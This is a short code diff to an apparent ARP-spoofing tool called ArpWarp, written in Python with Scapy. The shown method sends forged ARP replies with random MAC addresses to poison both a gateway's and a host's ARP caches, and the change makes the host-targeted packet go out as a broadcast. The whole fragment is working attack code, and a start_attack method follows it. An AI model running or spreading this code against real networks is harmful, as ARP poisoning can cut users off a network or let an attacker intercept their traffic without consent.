@@ -64,9 +64,10 @@ class ArpWarp:
             # poison gateways's arp cache
             arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
             sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
+
             # poison host's arp cache
             arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst=host_ip)
-            sendp(Ether() / arp_packet_host, iface=self.network_interface)
+            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
 
     def start_attack(self):
         loop_count = 0
